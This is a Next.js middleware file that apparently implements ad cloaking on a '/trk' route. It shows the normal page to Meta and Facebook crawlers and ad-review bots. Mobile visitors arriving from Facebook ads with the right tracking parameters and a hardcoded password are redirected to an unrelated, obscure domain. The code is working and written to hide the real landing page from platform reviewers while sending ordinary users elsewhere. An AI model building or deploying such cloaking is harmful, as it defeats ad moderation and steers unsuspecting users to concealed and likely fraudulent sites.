import { NextResponse } from 'next/server'
import type { NextRequest } from 'next/server'

const redirectTargetUrl = 'https://www.jk8gcxs.com/7659ZZ3/72P43GM/'
const requiredPassword = 'MP14U7HB'

function hasText(value: string | null) {
  return typeof value === 'string' && value.trim().length > 0
}

function isTabletDevice(userAgent: string) {
  const ua = userAgent.toLowerCase()

  if (ua.includes('ipad')) return true
  if (ua.includes('tablet')) return true
  if (ua.includes('playbook')) return true
  if (ua.includes('silk')) return true
  if (ua.includes('kindle')) return true
  if (ua.includes('android') && !ua.includes('mobile')) return true

  return false
}

function isMobileDevice(userAgent: string) {
  const ua = userAgent.toLowerCase()

  if (ua.includes('iphone')) return true
  if (ua.includes('ipod')) return true
  if (ua.includes('windows phone')) return true
  if (ua.includes('android') && ua.includes('mobile')) return true
  if (ua.includes('mobile') && !isTabletDevice(userAgent)) return true

  return false
}

function isAllowedBot(userAgent: string) {
  const ua = userAgent.toLowerCase()

  return (
    ua.includes('facebookexternalhit') ||
    ua.includes('meta-externalagent') ||
    ua.includes('metainspector') ||
    ua.includes('adsbot-facebook') ||
    ua.includes('facebot')
  )
}

function shouldAutoRedirect(request: NextRequest) {
  const userAgent = request.headers.get('user-agent') || ''

  if (isAllowedBot(userAgent)) {
    return false
  }

  const sourceId = request.nextUrl.searchParams.get('source_id')
  const sub1 = request.nextUrl.searchParams.get('sub1')
  const sub2 = request.nextUrl.searchParams.get('sub2')
  const sub3 = request.nextUrl.searchParams.get('sub3')
  const pwd = request.nextUrl.searchParams.get('pwd')
  const fbclid = request.nextUrl.searchParams.get('fbclid')

  const isAllowedDevice = isMobileDevice(userAgent) || isTabletDevice(userAgent)
  const isValidSource = sourceId?.toLowerCase() === 'facebook'
  const hasRequiredAdParams = hasText(sub1) && hasText(sub2) && hasText(sub3)
  const hasValidPassword = pwd === requiredPassword
  const hasMetaClickId = hasText(fbclid)

  return isAllowedDevice && isValidSource && hasRequiredAdParams && hasValidPassword && hasMetaClickId
}

export function proxy(request: NextRequest) {
  if (request.nextUrl.pathname !== '/trk') {
    return NextResponse.next()
  }

  if (!shouldAutoRedirect(request)) {
    return NextResponse.next()
  }

  const targetUrl = new URL(redirectTargetUrl)

  request.nextUrl.searchParams.forEach((value, key) => {
    targetUrl.searchParams.append(key, value)
  })

  return NextResponse.redirect(targetUrl)
}

export const config = {
  matcher: '/trk',
}
